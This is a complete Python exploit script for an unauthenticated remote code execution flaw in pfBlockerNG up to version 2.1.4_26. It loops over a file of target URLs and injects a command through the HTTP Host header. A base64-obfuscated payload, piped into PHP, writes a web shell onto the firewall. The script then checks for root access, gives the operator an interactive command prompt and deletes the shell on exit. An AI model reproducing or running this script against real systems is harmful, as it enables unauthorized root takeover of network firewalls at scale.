#!/usr/bin/env python3

import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def print_banner():
    banner = """
    +--------------------------------------------------+
    |                    Happy Hunting                |
    |                        by NUR@                   |
    +--------------------------------------------------+
    """
    print(banner)

def parse_arguments():
    parser = argparse.ArgumentParser(description="pfBlockerNG <= 2.1.4_26 Unauth RCE")
    parser.add_argument(
        '--file',
        required=True,
        help=(
            "File containing URLs, one per line. Each URL should be a fully qualified URL "
            "to the target pfBlockerNG instance, for example: 'http://example.com'. "
            "The script will attempt to exploit the pfBlockerNG vulnerability on each URL."
        )
    )
    return parser.parse_args()

def check_endpoint(TARGET_URL):
    response = requests.get(f'{TARGET_URL}/pfblockerng/www/index.php', verify=False)
    if response.status_code == 200:
        print(f"[+] pfBlockerNG is installed on {TARGET_URL}")
        return True
    else:
        print(f"[-] pfBlockerNG not installed on {TARGET_URL}")
        return False

def upload_shell(TARGET_URL, SHELL_NAME):
    payloads = [
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"},
        # Add other payloads as needed...
    ]

    print(f"[/] Uploading shell to {TARGET_URL}...")
    for payload in payloads:
        print(f"[+] Testing Payload: {payload}")
        response = requests.get(f'{TARGET_URL}/pfblockerng/www/index.php', headers=payload, verify=False)
        if response.status_code == 400:
            print("[/] Uploading shell with a new payload...")
            response = requests.get(f'{TARGET_URL}/pfblockerng/www/index.php', headers=payload, verify=False)
            if response.status_code != 400:
                break

    time.sleep(2)
    response = requests.get(f'{TARGET_URL}/system_advanced_control.php?c=id', verify=False)
    if 'uid=0(root) gid=0(wheel)' in str(response.content, 'utf-8'):
        print(f"[+] Upload succeeded on {TARGET_URL}")
        return True
    else:
        print(f"[-] Error uploading shell on {TARGET_URL}. Possibly patched: {response.content}")
        return False

def interactive_shell(TARGET_URL, SHELL_NAME):
    while True:
        try:
            cmd = input("# ")
            response = requests.get(f'{TARGET_URL}/system_advanced_control.php?c={urllib.parse.quote(cmd, safe="")}', verify=False)
            print(response.text)
        except KeyboardInterrupt:
            delete_shell(TARGET_URL, SHELL_NAME)
            break

def delete_shell(TARGET_URL, SHELL_NAME):
    del_cmd = "rm /usr/local/www/system_advanced_control.php"
    requests.get(f'{TARGET_URL}/system_advanced_control.php?c={urllib.parse.quote(del_cmd, safe="")}', verify=False)
    print("[+] Shell deleted")

if __name__ == '__main__':
    print_banner()
    args = parse_arguments()

    with open(args.file, 'r') as file:
        urls = file.readlines()

    for url in urls:
        TARGET_URL = url.strip()
        if TARGET_URL:
            if check_endpoint(TARGET_URL):
                if upload_shell(TARGET_URL, "system_advanced_control.php"):
                    interactive_shell(TARGET_URL, "system_advanced_control.php")
